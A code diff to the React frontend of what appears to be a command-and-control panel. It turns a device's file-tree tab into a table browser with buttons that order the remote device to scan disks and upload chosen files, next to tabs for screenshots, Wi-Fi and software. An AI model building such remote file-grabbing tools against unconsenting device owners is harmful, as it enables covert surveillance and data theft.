@@ -2,10 +2,10 @@ import { PageContainer, ProCard } from '@ant-design/pro-components';
 import { useParams, useRequest } from '@umijs/max';
 import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select } from 'antd';
 import React, { useEffect, useState } from 'react';
-import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet } from '@/services/backend/c2DeviceController';
+import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet, listFilesUsingGet, requestScanUsingPost } from '@/services/backend/c2DeviceController';
 import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
 import { listScreenshotsUsingGet } from '@/services/backend/c2Controller';
-import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined } from '@ant-design/icons';
+import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined, ArrowUpOutlined, FolderOpenOutlined, FileOutlined, DesktopOutlined } from '@ant-design/icons';
 
 const { Paragraph } = Typography;
 
@@ -147,135 +147,125 @@ const WifiTab = ({ uuid, onRefresh }: { uuid: string; onRefresh: () => void }) =
 
 import { requestScanUsingPost, listFilesUsingGet } from '@/services/backend/c2FileController';
 
-const FileTreeTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: string, params?: string) => void }) => {
-    const [treeData, setTreeData] = useState<any[]>([]);
-    const [expandedKeys, setExpandedKeys] = useState<React.Key[]>([]);
+const FileTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: string, params?: string) => void }) => {
+    const [fileList, setFileList] = useState<any[]>([]);
+    const [currentPath, setCurrentPath] = useState('');
     const [loading, setLoading] = useState(false);
-    const [loadedKeys, setLoadedKeys] = useState<React.Key[]>([]);
 
-    const fetchFiles = async (parentPath: string = '') => {
-        if (!uuid) return [];
+    // Fetch files for current path
+    const fetchFiles = async (path: string) => {
+        setLoading(true);
         try {
-            const res = await listFilesUsingGet({
+             const res = await listFilesUsingGet({
                 deviceUuid: uuid,
-                parentPath: parentPath,
+                parentPath: path,
                 current: 1,
-                pageSize: 1000 // Get all files in directory
-            });
-            return res?.data?.data?.records || [];
+                pageSize: 1000
+             });
+             const list = res?.data?.data?.records || [];
+             setFileList(list);
+             
+             // If empty, maybe trigger scan?
+             if (list.length === 0 && path !== '') {
+                 // Try scanning this path
+                 try {
+                     await requestScanUsingPost({ deviceUuid: uuid, path });
+                     message.info('已触发目录扫描，请稍后刷新');
+                 } catch(e) {}
+             }
         } catch (e) {
-            console.error('Fetch files error:', e);
-            return [];
+             message.error('加载文件失败');
+        } finally {
+             setLoading(false);
         }
     };
 
-    const onLoadData = async ({ key, children }: any) => {
-        if (children && children.length > 0) return;
-        
-        const path = key as string;
-        const files = await fetchFiles(path);
-        
-        if (files.length === 0) {
-            // Trigger scan if empty
-            message.info('目录为空或未缓存，下发扫描任务...');
-            try {
-                await requestScanUsingPost({
-                    deviceUuid: uuid,
-                    path: path
-                });
-                // Wait a bit or let user refresh manually?
-                // User said "return if exists, else trigger scan".
-                // Maybe show a temporary "Scanning..." node?
-                return new Promise<void>(resolve => {
-                    setTimeout(() => {
-                         // We don't have real-time push, so we just resolve.
-                         // User might need to collapse/expand or click refresh.
-                         resolve();
-                    }, 500);
-                });
-            } catch (e) {
-                message.error('扫描任务下发失败');
-            }
-        }
-
-        const nodes = files.map((file: any) => ({
-            title: file.name,
-            key: file.path,
-            isLeaf: file.isDirectory !== 1,
-            icon: file.isDirectory === 1 ? <FolderOpenOutlined /> : <FileOutlined />,
-            data: file
-        }));
-
-        setTreeData(origin => updateTreeData(origin, key, nodes));
-    };
-
-    const updateTreeData = (list: any[], key: React.Key, children: any[]): any[] => {
-        return list.map(node => {
-            if (node.key === key) {
-                return { ...node, children };
-            }
-            if (node.children) {
-                return { ...node, children: updateTreeData(node.children, key, children) };
-            }
-            return node;
-        });
-    };
-
-    // Initial load (Roots)
     useEffect(() => {
-        const loadRoots = async () => {
-            setLoading(true);
-            const roots = await fetchFiles('');
-            const nodes = roots.map((file: any) => ({
-                title: file.name || file.path,
-                key: file.path,
-                isLeaf: file.isDirectory !== 1,
-                icon: file.isDirectory === 1 ? <DesktopOutlined /> : <FileOutlined />,
-                data: file
-            }));
-            setTreeData(nodes);
-            setLoading(false);
-        };
-        loadRoots();
-    }, [uuid]);
+        fetchFiles(currentPath);
+    }, [uuid, currentPath]);
 
-    const onSelect = (selectedKeys: React.Key[], info: any) => {
-        console.log('selected', selectedKeys, info);
-        const node = info.node;
-        if (node.isLeaf) {
-            // Show file actions
-            Modal.confirm({
-                title: '文件操作',
-                content: `确定要上传文件 ${node.title} 吗？`,
-                onOk: () => {
-                    onSendCommand('upload_file', node.key);
-                    message.success('上传任务已下发');
-                }
-            });
+    const handleEnterFolder = (record: any) => {
+        if (record.isDirectory === 1) {
+            setCurrentPath(record.path);
         }
     };
+    
+    const handleGoUp = () => {
+        if (!currentPath) return;
+        
+        // Remove trailing slash if exists (except root)
+        let path = currentPath;
+        if (path.length > 1 && (path.endsWith('/') || path.endsWith('\\'))) {
+            path = path.substring(0, path.length - 1);
+        }
+        
+        const lastSep = Math.max(path.lastIndexOf('/'), path.lastIndexOf('\\'));
+        if (lastSep === -1) {
+            setCurrentPath('');
+        } else {
+            setCurrentPath(path.substring(0, lastSep));
+        }
+    };
+    
+    const columns = [
+        {
+            title: '名称',
+            dataIndex: 'name',
+            key: 'name',
+            render: (text: string, record: any) => (
+                <Space>
+                    {record.isDirectory === 1 ? <FolderOpenOutlined style={{color: '#faad14'}} /> : <FileOutlined />}
+                    {record.isDirectory === 1 ? (
+                        <a onClick={() => handleEnterFolder(record)}>{text}</a>
+                    ) : (
+                        <span>{text}</span>
+                    )}
+                </Space>
+            )
+        },
+        {
+            title: '大小',
+            dataIndex: 'size',
+            key: 'size',
+            width: 120,
+            render: (val: number) => val ? (val / 1024).toFixed(2) + ' KB' : '-'
+        },
+        {
+             title: '操作',
+             key: 'action',
+             width: 100,
+             render: (_, record: any) => (
+                 record.isDirectory !== 1 && (
+                     <Button type="link" size="small" onClick={() => {
+                        Modal.confirm({
+                            title: '确认上传',
+                            content: `是否上传文件 ${record.name}?`,
+                            onOk: () => onSendCommand('upload_file', record.path)
+                        });
+                     }}>上传</Button>
+                 )
+             )
+        }
+    ];
 
     return (
         <Space direction="vertical" style={{ width: '100%' }}>
-            <Button icon={<ReloadOutlined />} onClick={() => setExpandedKeys([])}>重置/刷新</Button>
-            {treeData.length === 0 ? (
-                <div style={{ textAlign: 'center', padding: 20 }}>
-                    <Button type="primary" onClick={() => onSendCommand('scan_disk', '')}>扫描磁盘驱动器</Button>
-                </div>
-            ) : (
-                <Tree
-                    showIcon
-                    blockNode
-                    treeData={treeData}
-                    loadData={onLoadData}
-                    onSelect={onSelect}
-                    expandedKeys={expandedKeys}
-                    onExpand={setExpandedKeys}
-                    loadedKeys={loadedKeys}
-                    onLoad={setLoadedKeys}
-                    height={600}
-                />
-            )}
+             <Space style={{ marginBottom: 16 }}>
+                 <Button icon={<ArrowUpOutlined />} onClick={handleGoUp} disabled={!currentPath}>返回上一级</Button>
+                 <Button icon={<ReloadOutlined />} onClick={() => fetchFiles(currentPath)}>刷新</Button>
+                 <Input value={currentPath} readOnly style={{ width: 400 }} placeholder="Root (Disk Drives)" />
+                 {fileList.length === 0 && (
+                     <Button onClick={() => onSendCommand('scan_disk', '')}>扫描磁盘</Button>
+                 )}
+             </Space>
+             <Table 
+                 dataSource={fileList} 
+                 columns={columns} 
+                 loading={loading}
+                 rowKey="path" 
+                 pagination={{ pageSize: 20 }}
+                 size="small"
+             />
         </Space>
     );
 };
@@ -596,7 +586,7 @@ const C2DeviceDetail: React.FC = () => {
             { 
                 label: '文件管理', 
                 key: 'files', 
-                children: <FileTreeTab uuid={uuid || ''} onSendCommand={sendCommand} /> 
+                children: <FileTab uuid={uuid || ''} onSendCommand={sendCommand} /> 
             },
             {
                 label: '截图记录',
